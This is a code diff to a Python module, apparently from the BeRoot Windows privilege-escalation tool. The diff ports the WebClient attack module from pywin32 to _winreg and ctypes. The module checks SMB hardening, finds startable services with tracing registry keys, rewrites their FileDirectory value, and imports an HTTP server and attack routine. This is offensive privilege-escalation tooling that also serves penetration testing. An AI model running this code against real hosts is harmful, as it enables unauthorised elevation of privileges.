@@ -1,12 +1,11 @@
-import win32api
-import win32con
-import win32service
-from ctypes.wintypes import *
-from ctypes import *
+from beroot.modules.objects.winstructures import *
 from httpserver import runHTTPServer
 from constant import constants
 from random import randint
 from attack import doAttack
+from ctypes.wintypes import *
+from ctypes import *
+import _winreg
 import time
 
 UCHAR 		= c_ubyte
@@ -36,7 +35,7 @@ class EVENT_DESCRIPTOR(Structure):
 class WebClient():
 
 	def __init__(self):
-		self.scm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_CONNECT)
+		self.scm = OpenSCManager(None, None, SC_MANAGER_CONNECT)
 
 		# Define functions
 		self.EventRegister 		= windll.advapi32.EventRegister
@@ -47,13 +46,13 @@ class WebClient():
 
 	# check if the system has been hardenned enough to avoid this kind of privilege escalation
 	def isSMBHardened(self):
-		hkey = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters', 0, win32con.KEY_READ)
+		hkey = _winreg.OpenKey(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters', 0, KEY_READ)
 		
 		smb_signature = 0
 		server_name_hardening = 0
 		try:
-			smb_signature = int(win32api.RegQueryValueEx(hkey, 'RequireSecuritySignature')[0])
-			server_name_hardening = int(win32api.RegQueryValueEx(hkey, 'SmbServerNameHardeningLevel')[0])
+			smb_signature = int(_winreg.QueryValueEx(hkey, 'RequireSecuritySignature')[0])
+			server_name_hardening = int(_winreg.QueryValueEx(hkey, 'SmbServerNameHardeningLevel')[0])
 		except:
 			pass
 
@@ -100,13 +99,13 @@ class WebClient():
 		return success
 
 	def find_services_trigger(self, service):
-		accessWrite = win32con.KEY_WRITE | win32con.KEY_ENUMERATE_SUB_KEYS | win32con.KEY_QUERY_VALUE
-		hkey = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Tracing', 0, accessWrite)
-		num = win32api.RegQueryInfoKey(hkey)[0]
+		accessWrite = KEY_WRITE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE
+		hkey = _winreg.OpenKey(HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Tracing', 0, accessWrite)
+		num = _winreg.QueryInfoKey(hkey)[0]
 
 		triggers = []
 		for x in range(0, num):
-			svc = win32api.RegEnumKey(hkey, x)
+			svc = _winreg.EnumKey(hkey, x)
 			for s in service:
 				if s.name.lower() == svc.lower() and s.permissions['start']:
 					isServiceRunning = self.isServiceRunning(svc)
@@ -115,66 +114,78 @@ class WebClient():
 						print '[+] Service %s found' % s.name
 					else:
 						print '[-] Service %s already running and could not be stopped' % s.name
-		win32api.RegCloseKey(hkey)
+		_winreg.CloseKey(hkey)
 		return triggers
 
 	def modify_registry(self, service_name, fileDirectory='%windir%\\tracing', enableFileTracing=0):
-		skey = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Tracing\\%s' % service_name, 0, win32con.KEY_WRITE)
-		win32api.RegSetValueEx(skey, 'FileDirectory', 0, win32con.REG_EXPAND_SZ, fileDirectory)
-		win32api.RegSetValueEx(skey, 'EnableFileTracing', 0, win32con.REG_DWORD, enableFileTracing)
-		win32api.RegCloseKey(skey)
+		skey = _winreg.OpenKey(HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Tracing\\%s' % service_name, 0, KEY_WRITE)
+		_winreg.SetValueEx(skey, 'FileDirectory', 0, REG_EXPAND_SZ, fileDirectory)
+		_winreg.SetValueEx(skey, 'EnableFileTracing', 0, REG_DWORD, enableFileTracing)
+		_winreg.CloseKey(skey)
 
 	# check if a service is stopped or if it is running
 	def isServiceRunning(self, service_name):
 		isRunning = False
-		sc_query_config = win32service.OpenService(self.scm, service_name, win32service.SERVICE_QUERY_STATUS)
-		status = win32service.QueryServiceStatus(sc_query_config)[1]
+		sc_query_config = OpenService(self.scm, service_name, SERVICE_QUERY_STATUS)
+		ss = SERVICE_STATUS()
+		if QueryServiceStatus(sc_query_config, byref(ss)):
+			status = int(ss.dwCurrentState.real)
+		else:
+			status = False
 		
-		if status == win32service.SERVICE_RUNNING:
+		if status == SERVICE_RUNNING:
 			isRunning = True
 
 		# wait that the service start correctly
-		if status == win32service.SERVICE_START_PENDING:	
+		if status == SERVICE_START_PENDING:	
 			time.sleep(2)
 			isRunning = True
 
-		win32service.CloseServiceHandle(sc_query_config)
+		CloseServiceHandle(sc_query_config)
 		return isRunning
 
 	# Open a service given either it's long or short name.
 	def SmartOpenService(self, hscm, name, access):
 		try:
-			return win32service.OpenService(hscm, name, access)
+			return OpenService(hscm, name, access)
 		except:
 			return False
 		
-		name = win32service.GetServiceKeyName(hscm, name)
-		return win32service.OpenService(hscm, name, access)
+		lpcchBuffer 	= LPDWORD()
+		lpDisplayName 	= PCTSTR()
+		lpServiceName 	= PCTSTR()
+		result = GetServiceKeyName(hscm, byref(lpDisplayName), byref(lpServiceName), lpcchBuffer)
+		if result:
+			name = lpServiceName.value
+			return OpenService(hscm, name, access)
+		else:
+			return False
 
 
-	def StartService(self, serviceName, args = None, machine = None):
-		hscm = win32service.OpenSCManager(machine, None, win32service.SC_MANAGER_CONNECT)
+	def StartService(self, serviceName, args = 0, machine = None):
+		hscm = OpenSCManager(machine, None, SC_MANAGER_CONNECT)
 		try:
-			hs = self.SmartOpenService(hscm, serviceName, win32service.SERVICE_START)
+			hs = self.SmartOpenService(hscm, serviceName, SERVICE_START)
 			if hs:
 				try:
-					win32service.StartService(hs, args)
+					StartService(hs, args, None)
 				finally:
-					win32service.CloseServiceHandle(hs)
+					CloseServiceHandle(hs)
 		finally:
-			win32service.CloseServiceHandle(hscm)
+			CloseServiceHandle(hscm)
 
 	def StopService(self, serviceName, machine = None):
-		hscm = win32service.OpenSCManager(machine, None, win32service.SC_MANAGER_CONNECT)
+		hscm = OpenSCManager(machine, None, SC_MANAGER_CONNECT)
 		try:
-			hs = self.SmartOpenService(hscm, serviceName, win32service.SERVICE_STOP)
+			hs = self.SmartOpenService(hscm, serviceName, SERVICE_STOP)
 			if hs:
 				try:
-					win32service.ControlService(hs, win32service.SERVICE_CONTROL_STOP)
+					ss = SERVICE_STATUS()
+					ControlService(hs, SERVICE_CONTROL_STOP, byref(ss))
 				finally:
-					win32service.CloseServiceHandle(hs)
+					CloseServiceHandle(hs)
 		finally:
-			win32service.CloseServiceHandle(hscm)
+			CloseServiceHandle(hscm)
 
 	def run(self, service, command):
 		print '[!] Checking WebClient vulnerability'
@@ -185,7 +196,6 @@ class WebClient():
 
 		# check if webclient is already running
 		if not self.isServiceRunning('WebClient'):
-			
 			# if not try to start it
 			if self.startWebclient():
 				
